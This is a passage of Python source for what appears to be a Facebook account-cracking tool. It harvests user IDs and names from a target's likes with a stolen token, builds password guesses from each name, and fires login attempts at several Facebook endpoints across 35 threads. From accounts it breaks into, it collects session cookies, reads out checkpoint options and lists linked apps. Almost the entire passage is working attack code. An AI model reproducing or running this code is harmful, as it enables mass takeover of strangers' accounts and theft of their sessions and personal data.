        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sType \'me\' To Get ID From Friendlist'%(K,P,K,P))
        it = input("%s[%s•%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))

### Generate Password
def pass_dev(_cici_):
    _dapunta_=[]
    ps = open('pass.txt','r').read()
    pp = open('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:
            continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
        else:
            _dapunta_.append(i)
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def tambah_pass():
    print('%s[%s Set Password %s]'%(K,P,K))
    print('%s[%s•%s] %sExample : sayang,bismillah,123456,786786'%(K,P,K,P))
    cuy = input('%s[%s•%s] %sInput Extra Manual Pass [1 Word] : '%(K,P,K,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s[%s•%s] %sExample : 321,786,gaming,ganteng'%(K,P,K,P))
    coy = input('%s[%s•%s] %sInput After Name Pass : '%(K,P,K,P))
    xy = open('passangka.txt','w')
    xy.write(coy)
    xy.close
    
### Logger Crack & Checker
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
    samp_  = sam_.split(';')
    final = ('%s; %s; %s; %s; %s'%(samp_[4],samp_[1],samp_[0],samp_[5],samp_[3]))
    return final
def cek_apk(h_ok,_dapunta_):
    apk = []
    ses_ = requests.Session()
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':_dapunta_})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    for asu in form_.find_all("h3"):
        try:
            celeng = asu.find('span').text
            apk.append('\n   • '+celeng)
        except:pass
    print(h_ok+''.join(apk))
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
        elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
        elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
        elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
        elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
        elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
        elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
        elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
        elif fx[:6] in ['100009']          :tahunz = ' • 2015'
        elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
        elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
        elif fx[:5] in ['10003']           :tahunz = ' • 2018'
        elif fx[:5] in ['10004']           :tahunz = ' • 2019'
        elif fx[:5] in ['10005']           :tahunz = ' • 2020'
        elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = ' • 2008/2009'
    elif len(fx)==8:
        tahunz = ' • 2007/2008'
    elif len(fx)==7:
        tahunz = ' • 2006/2007'
    else:tahunz=''
    return tahunz

### Crack
class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('')
        while True:
            try:
                while True:
                    try:
                        self.apk = files
                        self.fs = open(self.apk).read().splitlines()
                        break
                    except Exception as e:
                        print ("   %s"%(e))
                        continue
                self.fl = []
                os.system('rm -rf pass.txt')
                os.system('rm -rf passangka.txt')
                tambah_pass()
                tambah_pass_angka()
                for i in self.fs:
                    try:
                        self.fl.append({"id":i.split("•")[0],"pw":pass_dev(i.split("•")[1])})
                    except:continue
                start_method()
                put = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
                print('')
                if put in ['']:
                    jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                    menu()
                elif put in ['1','01','001','a']:
                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
                    if puf in ['']:
                        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                        menu()
                    elif puf in ['1','01','001','y','Y']:
                        cek_license()
                        started()
                        ThreadPool(35).map(self.api_opsi,self.fl)
                        os.remove(self.apk)
                        exit
